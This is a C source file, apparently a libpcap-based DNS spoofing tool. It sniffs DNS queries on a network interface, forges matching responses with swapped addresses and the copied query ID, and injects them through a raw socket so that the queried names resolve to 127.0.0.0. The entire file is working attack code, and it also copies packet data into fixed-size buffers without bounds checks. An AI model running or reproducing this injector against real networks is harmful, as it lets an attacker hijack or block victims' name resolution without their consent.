#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <unistd.h>

/* default snap length (maximum bytes per packet to capture) */
#define SNAP_LEN 1518

/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14
#define SIZE_DNS_ANSWER_DATA_1 16
#define SIZE_DNS_HEADER 12

/* IP header */
struct sniff_ip {
        u_char  ip_vhl;                 /* version << 4 | header length >> 2 */
        u_char  ip_tos;                 /* type of service */
        u_short ip_len;                 /* total length */
        u_short ip_id;                  /* identification */
        u_short ip_off;                 /* fragment offset field */
        #define IP_RF 0x8000            /* reserved fragment flag */
        #define IP_DF 0x4000            /* dont fragment flag */
        #define IP_MF 0x2000            /* more fragments flag */
        #define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
        u_char  ip_ttl;                 /* time to live */
        u_char  ip_p;                   /* protocol */
        u_short ip_sum;                 /* checksum */
        struct  in_addr ip_src,ip_dst;  /* source and dest address */
};

struct dns_header {
	u_short id;
	u_short flags;
	u_short qdcount;
	u_short ancount;
	u_short nscount;
	u_short arcount;
};

struct dns_query {
	u_short type;
	u_short class;
};

struct dns_answer_data{
    u_short type;
    u_short class;
} __attribute__((packed, aligned(1)));

struct dns_answer_data_1{
    u_short name;
    u_short type;
    u_short class;
    u_int ttl;    // 4 bytes for ttl
    u_short rdlength;    // 2 bytes for rdlength. This will be set to 4.
    u_int rdata; // 4 bytes for the IP address
} __attribute__((packed, aligned(1)));

struct dns_answer {
	u_char name[100];
	u_char separator;
};

#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
#define TH_OFF(th)      		((th)->th_off)

void
got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

void send_forged_dns_response(unsigned long destination_address, u_int16_t destination_port, \
							char *data, u_short ip_length)
{
	int sd, one = 1;
	const int *val = &one;
	
	// Source
	struct sockaddr_in source;
	sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

	struct in_addr addr;
	source.sin_family = AF_INET;
	source.sin_port = destination_port;
	//inet_aton(temp, &addr);
	source.sin_addr.s_addr = destination_address;
	
	// Inform the kernel do not fill up the headers' structure, we fabricated our own
	setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));

	sendto(sd, data, ip_length, 0, (struct sockaddr *)&source, sizeof(source));
	close(sd);
}
void print_ip_packet(const u_char *packet, u_char **payload, int *size_payload, u_char* stringExpression)
{
	const struct sniff_ip *ip;              /* The IP header */

	int size_ip;
	int size_tcp;
	/* define/compute ip header offset */
	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
	size_ip = IP_HL(ip)*4;
	if (size_ip < 20) {
		printf("   * Invalid IP header length: %u bytes\n", size_ip);
		return;
	}
	
	const struct udphdr *udp;
	/* determine protocol */
	switch(ip->ip_p) {
		case IPPROTO_UDP:
			udp = (struct udphdr*)(packet + SIZE_ETHERNET + size_ip);

			*payload = (u_char *)(packet + SIZE_ETHERNET);
			*size_payload = ntohs(ip->ip_len);

			char datagram[150];

			// Forging the IP header
			struct sniff_ip *spoofed_ip_header = (struct sniff_ip *)datagram;
			//memset(datagram, 0, 8192);

			spoofed_ip_header->ip_vhl = ip->ip_vhl;
			spoofed_ip_header->ip_tos = ip->ip_tos;

			int size_of_forged_dns_response = ntohs(ip->ip_len) + 16;
			spoofed_ip_header->ip_len = htons(size_of_forged_dns_response);
			spoofed_ip_header->ip_id = ip->ip_id;
			spoofed_ip_header->ip_off = ip->ip_off;
			spoofed_ip_header->ip_ttl = 200;
			spoofed_ip_header->ip_p = ip->ip_p;
			spoofed_ip_header->ip_sum = 0;
			spoofed_ip_header->ip_src.s_addr = ip->ip_dst.s_addr;
			spoofed_ip_header->ip_dst.s_addr = ip->ip_src.s_addr;

			// Forging the UDP header
			struct udphdr* spoofed_udp_header = (struct udphdr*)(datagram + size_ip);
			spoofed_udp_header->uh_sport = udp->uh_dport;
			spoofed_udp_header->uh_dport = udp->uh_sport;
			spoofed_udp_header->uh_ulen	 = htons(ntohs(udp->uh_ulen) + 16);
			spoofed_udp_header->uh_sum = 0;

			if(ntohs(udp->uh_dport) == 53)
			{
				// Forging the DNS Header
				struct dns_header* spoofed_dns_header = (struct dns_header*)(datagram + size_ip + 8);
				const struct dns_header *dns;
				dns = (struct dns_header*)(packet + SIZE_ETHERNET + size_ip + 8);
				spoofed_dns_header->id = dns->id;
				spoofed_dns_header->flags = htons(33152); // Setting flags as 8180 (33152 is 81 80 in hexadecimal)
				spoofed_dns_header->qdcount = dns->qdcount;
				spoofed_dns_header->ancount = htons(1);
				spoofed_dns_header->nscount = dns->nscount;
				spoofed_dns_header->arcount = dns->arcount;

				// Forging the DNS Answer

				// Copying the domain name
				char name1[100];
				//memset(name1, '\0', sizeof(name1));
				char *domain = (char*)(packet + SIZE_ETHERNET + size_ip + 8 + SIZE_DNS_HEADER);
				int domain_length = strlen(domain);

				struct dns_answer* spoofed_dns_answer = (struct dns_answer*)(datagram + size_ip + 8 + SIZE_DNS_HEADER);

				strcpy((char*)spoofed_dns_answer->name, (const char*)domain);

				const struct dns_query *query;
				query = (struct dns_query*)(packet + SIZE_ETHERNET + size_ip + 8 + SIZE_DNS_HEADER \
										 + domain_length + 1);


				// Copying the null terminator for end of the domain and also copying the type and class fields
				spoofed_dns_answer->separator = 0;
				// Populating Answer Data
				struct dns_answer_data* answer_data;
				answer_data = (struct dns_answer_data*)(datagram + size_ip + 8 + SIZE_DNS_HEADER \
						    + domain_length + 1);
				answer_data->type = query->type;
				answer_data->class = query->class;

				
				struct dns_answer_data_1* answer_data1;
				answer_data1 = (struct dns_answer_data_1*)(datagram + size_ip + 8 + SIZE_DNS_HEADER \
						    + domain_length + 1 + sizeof(struct dns_answer_data));
				answer_data1->name = htons(49164);  // c0 0c
				answer_data1->type = query->type;
				answer_data1->class = query->class;
				answer_data1->ttl = htonl(600); // Keeping a 
				answer_data1->rdlength = htons(4); // ip value is 4 bytes, hence this is 4
				answer_data1->rdata = htonl(2130706432);  // 127.0.0.0

				if(ntohs(query->type) != 1 || ntohs(query->class) != 1)
				    return;

				if (stringExpression == NULL || ((*size_payload > 0) && strstr((char*)*payload, (char*)stringExpression))){

				    send_forged_dns_response(ip->ip_src.s_addr, udp->uh_sport, datagram, size_of_forged_dns_response);
				}
			}
			break;
		default:
			break;
	}
}
void
got_packet(u_char *stringExpression, const struct pcap_pkthdr *header, const u_char *packet)
{
	/* declare pointers to packet headers */
	const struct ether_header *ethernet;  /* The ethernet header [1] */

	int size_payload;
	u_char *payload;
	
	ethernet = (struct ether_header*)(packet);
	
	switch(ntohs(ethernet->ether_type))
	{
		case ETHERTYPE_IP:
			print_ip_packet(packet, &payload, &size_payload, stringExpression);
			break;
		default:
			break;
	}
}

int main(int argc, char **argv)
{
	//thiszone = localtime(0);
	char *dev = NULL;			/* capture device name */
	char *pcapFileName = NULL;
	char *stringExpression = NULL;
	char *filter_exp;		/* filter expression [3] */

	char errbuf[PCAP_ERRBUF_SIZE];		/* error buffer */
	pcap_t *handle;				/* packet capture handle */

	struct bpf_program fp;			/* compiled filter program (expression) */
	bpf_u_int32 mask;			/* subnet mask */
	bpf_u_int32 net;			/* ip */
	int num_packets = 0, index;			/* number of packets to capture */

	char c;
	while ((c = getopt (argc, argv, "i:r:s:")) != -1)
	{
		switch(c) {
			case 'i':
					dev = optarg;
					break;
			case 'r':
					pcapFileName = optarg;
					break;
			case 's':
					stringExpression = optarg;
					break;
			default:
					abort();
		}

    }
    index = optind;
    filter_exp = argv[index];

    if(dev == NULL)
    {
    	dev = pcap_lookupdev(errbuf);
		if (dev == NULL) {
			fprintf(stderr, "Couldn't find default device: %s\n",
			    errbuf);
			exit(EXIT_FAILURE);
		}
	}
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n",
		    dev, errbuf);
		net = 0;
		mask = 0;
	}

	if(pcapFileName != NULL)
	{
		handle = pcap_open_offline(pcapFileName, errbuf);
		if (handle == NULL) {
			fprintf(stderr, "Couldn't open file %s: %s\n", pcapFileName, errbuf);
			exit(EXIT_FAILURE);
		}
	}
	else
	{
		handle = pcap_open_live(dev, SNAP_LEN, 0, 1000, errbuf);
		if (handle == NULL) {
			fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
			exit(EXIT_FAILURE);
		}
	}

	if (pcap_datalink(handle) != DLT_EN10MB) {
		fprintf(stderr, "%s is not an Ethernet\n", dev);
		exit(EXIT_FAILURE);
	}

	/* compile the filter expression */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n",
		    filter_exp, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}

	/* apply the compiled filter */
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n",
		    filter_exp, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}

	/* now we can set our callback function */
	pcap_loop(handle, num_packets, got_packet, (u_char*)stringExpression);

	pcap_freecode(&fp);
	pcap_close(handle);
	return 0;
}
